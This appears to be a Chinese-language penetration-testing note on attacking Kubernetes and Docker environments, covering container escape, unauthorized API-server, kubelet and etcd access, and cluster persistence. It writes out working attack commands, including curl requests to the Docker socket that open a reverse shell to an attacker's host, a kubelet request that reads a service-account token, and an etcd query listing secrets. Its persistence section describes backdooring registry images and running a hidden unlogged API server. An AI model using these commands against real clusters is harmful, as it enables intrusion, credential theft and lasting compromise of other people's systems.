## 逃逸

### 挂载/var/log逃逸

利用条件

- 挂载了/var/log
- 容器是在一个 k8s 的环境中
- 当前 pod 的 serviceaccount 拥有 get|list|watch log 的权

```
kubectl exec -it escaper /bin/bash
```

检测当前环境是否存在漏洞

```
find / -name lastlog 2>/dev/null | wc -l | grep -q 3 && echo "/var/log is mounted." || echo "/var/log is not mounted."
```

![image-20240312212439573](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240312212439573.png)

创建软链接，访问宿主机文件

```
cd /var/log/host
ln -s / ./root_link
```

![image-20240312212630215](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240312212630215.png)

> 想要反弹shell需要对挂载目录具有可写权限

kubelet在node上启动一个文件服务器提供日志查询服务，目录为`/var/log`，查询api为`/logs`。

kubelet查询相应pod的日志，实际是访问`/var/log/`目录下对应容器目录下的`0.log`文件，该文件本质上是一个符号链接，目标日志文件在`/var/lib/docker/containers`目录下

kubelet查看日志文件支持文符号链接。如果容器内挂载了主机`/var/log`目录，可以通过在容器内创建符号链接到`/`,再利用`/logs`可以访问node主机上的任意文件，造成pod逃逸问题

### 利用Service Account连接API Server执行指令

高权限的serviceaccount可以连接apiserver来执行命令，如果获取到的pod使用高权限的service account,我们就可以连接api来执行命令

## 初期访问

### 云AK泄露

accesskey-可以理解为在集群当中进行鉴权使用

如果泄露了可以用来登录控制台，进行shell反弹的操作等

### API-server未授权

k8s集群通过API来进行集群的控制，API-Server则提供了这个功能，通过控制API-server，我们可以通过创建任意的pod进行卷挂载来拿下node.

api-server分为两个端口

8080 - insecure-port,开启这个端口时.api-server不需要鉴权，可以进行任意的访问

6443 - secure-port ,这个端口用于api-server的正常服务活动

8080端口利用条件较为苛刻，需要通过满足低版本和暴露端口，6443我们通常利用其配置错误

#### secure-port配置错误

当我们不使用凭证去访问api-server时，服务器会将我们标记为system:anonymous用户，这个用户的权限是非常低的，但当管理员出现配置错误，将该用户绑定到一个高权限用户组，就导致我们利用api-server

```yaml
#amin-bind.yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: custom-cluster-admin-binding
subjects:
- kind: User
  name: "system:anonymous"
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
```

![image-20240401173307234](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240401173307234.png)

### configfile泄露

k8s configfile配置文件中可能会有api-server登陆凭证等敏感信息

![image-20240402104305241](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402104305241.png)

### 利用docker.sock

Docker daemon通过docker.sock这个文件去管理docker容器，Docker daemon也可以通过配置将docker.sock暴露在端口上，一般情况下2375端口用于未认证的HTTP通信，2376用于可信的HTTPS通信。

#### 公网暴露的docker daemon

```
server="Docker" && port="2375"
```

![image-20240402110025470](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402110025470.png)

此后我们可以通过docker.sock来执行命令

```
curl -X POST "http://ip:2375/containers/{container_id}/exec" -H "Content-Type: application/json" --data-binary '{"Cmd": ["bash", "-c", "bash -i >& /dev/tcp/xxxx/1234 0>&1"]}'
```

#### 利用现成的docker.sock

通常是在容器中挂载了/var/run/docker.sock

利用这一点我们可以完成容器逃逸操作

```
curl -s --unix-socket /var/run/docker.sock -X POST "http://docker_daemon_ip/containers/{container_id}/exec" -H "Content-Type: application/json" --data-binary '{"Cmd": ["bash", "-c", "bash -i >& /dev/tcp/xxxx/1234 0>&1"]}'

curl -s --unix-socket /var/run/docker.sock -X POST "http://docker_daemon_ip/exec/{id}/start" -H "Content-Type: application/json" --data-binary "{}"
```

### kubelet未授权

kubectl位于master节点，在对node上的pod进行操作时，会先和node上的kubelet进行联系，再通过kubelet进行操作

kubelet对应的API端口默认在10250，运行在集群中每台Node上，kubelet 的配置文件在node上的/var/lib/kubelet/config.yaml

![image-20240402114235584](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402114235584.png)

第一个参数代表是否允许匿名访问，第二参数则是用于访问控制

```
关于authorization-mode还有以下的配置
--authorization-mode=ABAC 基于属性的访问控制（ABAC）模式允许你 使用本地文件配置策略。
--authorization-mode=RBAC 基于角色的访问控制（RBAC）模式允许你使用 Kubernetes API 创建和存储策略。
--authorization-mode=Webhook WebHook 是一种 HTTP 回调模式，允许你使用远程 REST 端点管理鉴权。
--authorization-mode=Node 节点鉴权是一种特殊用途的鉴权模式，专门对 kubelet 发出的 API 请求执行鉴权。
--authorization-mode=AlwaysDeny 该标志阻止所有请求。仅将此标志用于测试。
--authorization-mode=AlwaysAllow 此标志允许所有请求。仅在你不需要 API 请求 的鉴权时才使用此标志。
```

将配置文件中，authentication-anonymous-enabled改为true，authorization-mode改为AlwaysAllow，再使用命令systemctl restart kubelet 重启kubelet，那么就可以实现kubelet未授权访问

![image-20240402115435300](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240402115435300.png)

+ 在pod内执行命令

  ```
  curl -XPOST -k https://node_ip:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=command"
  ```

+ 获取容器内service account凭据

  ```
  curl -XPOST -k https://node_ip:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=cat /var/run/secrets/kubernets.io/serviceaccount/token"
  ```

### etcd未授权

etcd是k8s中的数据库组件，用来存储集群中的token等资源，服务默认部署在2379端口，如果该端口存在未授权就可以通过etcd查询集群内管理员的token，然后用这个token访问api server接管集群。

需要注意的是k8s使用的etcd是v3版本

```
etcdctl --endpoints=https://etcd_ip:2375/ get / --prefix --keys-only | grep /secrets/
```

## 权限维持

权限维持和linux思路差不多，这里主要讲讲云上集群中特殊的维权方式

### 镜像投毒

接管对方的私有镜像库，并对其中的镜像添加恶意操作行为，例如对dockerfile添加shell连接的操作.或者编辑镜像的文件层代码，将镜像中原始的可执行文件或链接库文件替换为精心构造的后门文件之后再次打包成新的镜像。

### 修改组件的授权访问

修改组件的访问权限，例如api-server,etcd,kubelet等，将其改为未授权状态，可以达到集群持久化的目的

### shadow api server

部署一个额外的未授权且不记录日志的api server以供我们进行持久化。

[工具利用](https://github.com/cdk-team/CDK/wiki/CDK-Home-CN)

## 参考链接

https://tttang.com/archive/1465/#toc_shadow-api-servercdk

